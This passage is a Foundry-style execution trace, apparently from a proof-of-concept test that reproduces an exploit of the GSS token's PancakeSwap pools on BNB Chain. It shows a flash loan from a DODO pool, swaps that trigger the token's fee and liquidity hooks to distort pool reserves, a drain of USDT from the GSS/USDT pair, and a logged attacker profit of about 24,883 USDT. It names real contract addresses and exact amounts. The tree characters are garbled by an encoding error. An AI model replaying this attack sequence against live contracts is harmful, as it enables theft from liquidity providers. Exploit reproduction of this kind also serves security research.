    в”‚   в”‚   в”‚   в”њв”Ђ [2537] 0x8A85f4d6D051de5C91933DA50A61E22cD562377D::balanceOf(GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 16312384781524521673041 [1.631e22]
    в”‚   в”‚   в”‚   в”њв”Ђ [5303] 0x8A85f4d6D051de5C91933DA50A61E22cD562377D::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1232737198706559843688819 [1.232e24]
    в”‚   в”‚   в”њв”Ђ [24728] GSS::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [396584] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(1232737198706559843688819 [1.232e24], 0, [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1692809033 [1.692e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [365653] GSS::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 1232737198706559843688819 [1.232e24])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [54495] PANCAKE_ROUTER_V2::swapExactTokensForTokens(166666666666666666666 [1.666e20], 0, [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66, 0x55d398326f99059fF775485246999027B3197955], 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, 1692808033 [1.692e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36357740098859750014223 [3.635e22], 57665670227026483727828 [5.766e22], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6881] GSS::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 166666666666666666666 [1.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 166666666666666666666 [1.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563846342222953151371166170 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [38332] GSS_USDT_POOL::swap(0, 262482758573041253820 [2.624e20], 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23171] USDT::transfer(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, 262482758573041253820 [2.624e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, value: 262482758573041253820 [2.624e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36524406765526416680889 [3.652e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57403187468453442474008 [5.74e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 36524406765526416680889 [3.652e22], reserve1: 57403187468453442474008 [5.74e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 166666666666666666666 [1.666e20], amount1In: 0, amount0Out: 0, amount1Out: 262482758573041253820 [2.624e20], to: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [166666666666666666666 [1.666e20], 262482758573041253820 [2.624e20]]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 262482758573041253820 [2.624e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25934] USDT::transferFrom(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], 262482758573041253820 [2.624e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, to: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 262482758573041253820 [2.624e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, spender: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 115792089237316195423570985008687907853269984665640564038909814702685256528502 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55972] PANCAKE_ROUTER_V2::addLiquidity(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], USDT: [0x55d398326f99059fF775485246999027B3197955], 166666666666666666667 [1.666e20], 262482758573041253820 [2.624e20], 0, 0, 0x4f64a23a0d8Ff69Aa326ed13a312f28A22D08714, 1692808033 [1.692e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], USDT: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36524406765526416680889 [3.652e22], 57403187468453442474008 [5.74e22], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6881] GSS::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 166666666666666666667 [1.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 166666666666666666667 [1.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563846175556286484704499503 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6034] USDT::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 261939857718343904456 [2.619e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 261939857718343904456 [2.619e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564038910357603539953877866 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [34809] GSS_USDT_POOL::mint(0x4f64a23a0d8Ff69Aa326ed13a312f28A22D08714)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36691073432193083347556 [3.669e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57665127326171786378464 [5.766e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x4f64a23a0d8Ff69Aa326ed13a312f28A22D08714, value: 919248672290080715426 [9.192e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 36691073432193083347556 [3.669e22], reserve1: 57665127326171786378464 [5.766e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 166666666666666666667 [1.666e20], amount1: 261939857718343904456 [2.619e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 919248672290080715426 [9.192e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 166666666666666666667 [1.666e20], 261939857718343904456 [2.619e20], 919248672290080715426 [9.192e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [60485] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(666666666666666666667 [6.666e20], 0, [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66, 0x55d398326f99059fF775485246999027B3197955, 0x6E905369F331da92A257Aea758aF0B8D93587A5e], 0x000000000000000000000000000000000000dEaD, 1692808033 [1.692e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6881] GSS::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 666666666666666666667 [6.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 666666666666666666667 [6.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563845508889619818037832836 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [667] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 895890744137724527324568 [8.958e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36691073432193083347556 [3.669e22], 57665127326171786378464 [5.766e22], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 37357740098859750014223 [3.735e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [18432] GSS_USDT_POOL::swap(0, 1026534808095138749393 [1.026e21], 0x8A85f4d6D051de5C91933DA50A61E22cD562377D, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3271] USDT::transfer(0x8A85f4d6D051de5C91933DA50A61E22cD562377D, 1026534808095138749393 [1.026e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x8A85f4d6D051de5C91933DA50A61E22cD562377D, value: 1026534808095138749393 [1.026e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 37357740098859750014223 [3.735e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 56638592518076647629071 [5.663e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 37357740098859750014223 [3.735e22], reserve1: 56638592518076647629071 [5.663e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 666666666666666666667 [6.666e20], amount1In: 0, amount0Out: 0, amount1Out: 1026534808095138749393 [1.026e21], to: 0x8A85f4d6D051de5C91933DA50A61E22cD562377D)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x8A85f4d6D051de5C91933DA50A61E22cD562377D::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 22385461593193504693564 [2.238e22], 104108255862275472724932 [1.041e23], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(0x8A85f4d6D051de5C91933DA50A61E22cD562377D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23411996401288643442957 [2.341e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [19656] 0x8A85f4d6D051de5C91933DA50A61E22cD562377D::swap(0, 4553873002841104953479 [4.553e21], 0x000000000000000000000000000000000000dEaD, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4430] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::transfer(0x000000000000000000000000000000000000dEaD, 4553873002841104953479 [4.553e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x8A85f4d6D051de5C91933DA50A61E22cD562377D, to: 0x000000000000000000000000000000000000dEaD, value: 4553873002841104953479 [4.553e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(0x8A85f4d6D051de5C91933DA50A61E22cD562377D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23411996401288643442957 [2.341e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [667] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::balanceOf(0x8A85f4d6D051de5C91933DA50A61E22cD562377D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99554382859434367771453 [9.955e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 23411996401288643442957 [2.341e22], reserve1: 99554382859434367771453 [9.955e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 1026534808095138749393 [1.026e21], amount1In: 0, amount0Out: 0, amount1Out: 4553873002841104953479 [4.553e21], to: 0x000000000000000000000000000000000000dEaD)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [667] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 900444617140565632278047 [9.004e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0xff63bdD9B161E8F24f926d3619BB577B0344F352, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0x9eaA65FF5dadF76eB62856e43bb2B46d808d3662, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0xef01E9b82BE6F2b2Fe2c55601945854aDa18EF6e, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 36982115961196795310664 [3.698e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, value: 12327371987065598436888 [1.232e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3151] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::distributeETHDividends(12327371987065598436888 [1.232e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendsDistributed(param0: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], param1: 12327371987065598436888 [1.232e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 12327371987065598436888 [1.232e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 1171100338771231851504379 [1.171e24])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3396] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [788] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 1208458078870091601518602 [1.208e24])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [50089] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::process(150000 [1.5e5])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640562806720385301353285951116 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10000000000000000 [1e16]
    в”‚   в”‚   в”‚   в”њв”Ђ [893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 37357740098859750014223 [3.735e22], 56638592518076647629071 [5.663e22], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1208458078870091601518602 [1.208e24]
    в”‚   в”‚   в”‚   в”њв”Ђ [21232] GSS_USDT_POOL::swap(0, 54883439810865059102747 [5.488e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6071] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 54883439810865059102747 [5.488e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 54883439810865059102747 [5.488e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1208458078870091601518602 [1.208e24]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1755152707211588526324 [1.755e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 1208458078870091601518602 [1.208e24], reserve1: 1755152707211588526324 [1.755e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 1171100338771231851504379 [1.171e24], amount1In: 0, amount0Out: 0, amount1Out: 54883439810865059102747 [5.488e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 54883449810865059102747 [5.488e22]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3271] USDT::transfer(DODOPool: [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A], 30000000000000000000000 [3e22])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DODOPool: [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A], value: 30000000000000000000000 [3e22])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24883449810865059102747 [2.488e22]
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "Attacker USDT balance after exploit", val: 24883449810865059102747 [2.488e22], decimals: 18)
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [2531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(DODOPool: [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 322304667215218905060 [3.223e20]
    в”‚   в”њв”Ђ [531] USDT::balanceOf(DODOPool: [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 449531270293071842776636 [4.495e23]
